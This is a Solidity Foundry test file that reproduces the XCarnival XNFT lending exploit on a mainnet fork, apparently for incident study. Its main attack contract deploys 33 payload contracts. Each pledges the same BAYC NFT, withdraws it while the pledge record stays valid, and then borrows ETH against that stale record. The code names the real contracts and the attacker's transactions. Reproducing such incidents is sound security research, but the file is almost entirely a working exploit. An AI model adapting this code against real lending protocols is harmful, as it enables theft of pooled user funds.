// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo
// Total Lost : 3087 ETH (~3,870,000 US$)
// Attacker Wallet : 0xb7cbb4d43f1e08327a90b32a8417688c9d0b800a
// Main Attack Contract : 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d
// Vulnerable Contract XNFT.sol : https://etherscan.io/address/0x39360ac1239a0b98cb8076d4135d0f72b7fd9909#code

// @Info
// XToken.sol : https://etherscan.io/address/0x5417da20ac8157dd5c07230cfc2b226fdcfc5663#code
// Proxy of XNFT.sol : 0xb14B3b9682990ccC16F52eB04146C3ceAB01169A
// P2Controller.sol : https://etherscan.io/address/0x34ca24ddcdaf00105a3bf10ba5aae67953178b85#code
// BAYC Contract: 0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d

// @News
// Official Announce : https://twitter.com/XCarnival_Lab/status/1541226298399653888
// PeckShield Alert Thread : https://twitter.com/peckshield/status/1541047171453034501
// Blocksec Alert Thread : https://twitter.com/BlockSecTeam/status/1541070850505723905

// @Shortcuts
/*
  Attacker Tx List : https://etherscan.io/txs?a=0xb7cbb4d43f1e08327a90b32a8417688c9d0b800a
    First `0xadf6a75d` call : https://etherscan.io/tx/0x422e7b0a449deba30bfe922b5c34282efbdbf860205ff04b14fd8129c5b91433
    First `Start` call : https://etherscan.io/tx/0xabfcfaf3620bbb2d41a3ffea6e31e93b9b5f61c061b9cfc5a53c74ebe890294d*/

interface IBAYC {
    function setApprovalForAll(address operator, bool _approved) external;

    function transferFrom(address from, address to, uint256 tokenId) external;

    function ownerOf(uint256 tokenId) external view returns (address owner);
}

interface IXNFT {
    function counter() external returns (uint256); // getter() for -> uint256 public counter;

    function pledgeAndBorrow(
        address _collection,
        uint256 _tokenId,
        uint256 _nftType,
        address xToken,
        uint256 borrowAmount
    ) external;

    function withdrawNFT(uint256 orderId) external;
}

interface IXToken {
    function borrow(uint256 orderId, address payable borrower, uint256 borrowAmount) external;
}

/* Contract: 0xa04ec2366641a2286782d104c448f13bf36b2304 */
interface INothing {
    function borrow(uint256 orderId, address payable borrower, uint256 borrowAmount) external;
}

/* Contract: 0x2d6e070af9574d07ef17ccd5748590a86690d175 */
contract payloadContract is Test {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 orderId = 0;
    IBAYC BAYC = IBAYC(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
    IXNFT XNFT = IXNFT(0xb14B3b9682990ccC16F52eB04146C3ceAB01169A);
    IXToken XToken = IXToken(0xB38707E31C813f832ef71c70731ed80B45b85b2d);
    INothing doNothing = INothing(0xA04EC2366641a2286782D104C448f13bF36B2304);

    constructor() {
        emit OwnershipTransferred(address(0), address(msg.sender));
        BAYC.setApprovalForAll(tx.origin, true);
    }

    // function 0x97c1edd3()
    function makePledge() public {
        BAYC.setApprovalForAll(address(XNFT), true);

        // Attacker was call `pledgeAndBorrow()`, But `pledge()` also vulnerable.
        XNFT.pledgeAndBorrow(address(BAYC), 5110, 721, address(doNothing), 0);

        orderId = XNFT.counter();
        assert(orderId >= 11); // Attacker start by orderId:11
        XNFT.withdrawNFT(orderId);

        BAYC.transferFrom(address(this), msg.sender, 5110);
    }

    // function 0x2a3e7cec()
    function dumpETH() public {
        XToken.borrow(orderId, payable(address(this)), 36 ether);
        payable(msg.sender).transfer(address(this).balance);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

/* Contract: 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d */
contract mainAttackContract is Test {
    address payable[33] public payloads;
    address attacker = 0xb7CBB4d43F1e08327A90B32A8417688C9D0B800a;
    IBAYC BAYC = IBAYC(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheat.createSelectFork("mainnet", 15_028_846); // fork mainnet at block 15028846

        cheat.deal(address(this), 0);
        emit log_named_decimal_uint("[*] Attacker Contract ETH Balance", address(this).balance, 18);

        // Mainnet TxID: 0x7cd094bc34c6700090f88950ab0095a95eb0d54c8e5012f1f46266c8871027ff
        emit log_string("\tAttacker send BAYC#5110 to Attack Contract...");
        cheat.roll(15_028_846);
        cheat.startPrank(attacker);
        BAYC.transferFrom(attacker, address(this), 5110);
        cheat.stopPrank();
    }

    // [Main Attack Contract].0xadf6a75d()
    function testExploit() public {
        // Set msg.sender = 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d (Main Attack Contract)
        // Set tx.origin = 0xb7CBB4d43F1e08327A90B32A8417688C9D0B800a (Attacker)
        cheat.startPrank(address(this), attacker);

        emit log_string("[Exploit] Making pledged record...");
        for (uint8 i = 0; i < payloads.length; ++i) {
            payloadContract payload = new payloadContract();
            cheat.deal(address(payload), 0); // Set balance 0 ETH to avoid conflict on forknet
            payloads[i] = payable(address(payload));

            BAYC.transferFrom(address(this), address(payloads[i]), 5110);
            require(BAYC.ownerOf(5110) == payloads[i], "BAYC#5110 Transfer Failed");

            payload.makePledge();
        }

        assert(payloads[0] != address(0));
        assert(payloads[32] != address(0));

        emit log_string("[Exploit] Dumping ETH from borrow...");
        for (uint8 i = 0; i < payloads.length; ++i) {
            payloads[i].call(abi.encodeWithSignature("dumpETH()"));
        }

        emit log_string("[*] Exploit Execution Completed!");
        emit log_named_decimal_uint("[*] Attacker Contract ETH Balance", address(this).balance, 18);
    }

    receive() external payable {}
}
